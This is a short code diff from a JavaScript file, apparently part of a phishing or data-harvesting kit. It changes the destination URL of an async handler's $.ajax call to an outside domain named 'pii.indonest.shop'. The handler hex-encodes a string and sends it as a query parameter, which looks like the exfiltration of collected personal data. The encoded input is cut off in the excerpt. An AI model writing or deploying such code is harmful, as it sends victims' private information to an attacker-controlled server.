@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://panel-jsrizz.businis.biz.id?cat="+
+                    "https://pii.indonest.shop?cat="+
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
